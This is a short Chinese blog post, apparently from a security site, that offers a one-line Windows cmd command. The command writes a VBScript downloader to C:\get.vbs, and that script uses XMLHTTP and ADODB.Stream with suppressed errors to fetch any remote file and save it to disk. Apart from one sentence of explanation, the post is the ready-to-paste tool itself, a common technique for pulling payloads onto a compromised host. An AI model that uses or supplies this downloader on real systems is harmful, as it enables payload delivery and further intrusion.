+++
title = "echo 一句话写入vbs下载者"
author = "Hzllaga"
date = 2018-07-23
description = ""
categories = ["原创"]
tags = ["vbs"]
+++

![](https://cdn.wtfsec.org/img/20200223165441.png)

使用方法很简单，直接运行就可以写入了

命令写得比较阳春，其实就是一行一行写入，懒得弄转义符，所以就这样吧~

下面是命令：
{{< highlight vbs >}}
echo on error resume next >> C:\get.vbs & echo iLocal=LCase(Wscript.Arguments(1)) >> C:\get.vbs & echo iRemote=LCase(Wscript.Arguments(0)) >> C:\get.vbs & echo Set xPost=createObject("Microsoft.XMLHTTP") >> C:\get.vbs & echo xPost.Open "GET",iRemote,0 >> C:\get.vbs & echo xPost.Send() >> C:\get.vbs & echo set sGet=createObject("ADODB.Stream") >> C:\get.vbs & echo sGet.Mode=3 >> C:\get.vbs & echo sGet.Type=1 >> C:\get.vbs & echo sGet.Open() >> C:\get.vbs & echo sGet.Write xPost.ResponseBody >> C:\get.vbs & echo sGet.SaveToFile iLocal,2 >> C:\get.vbs
{{< / highlight  >}}
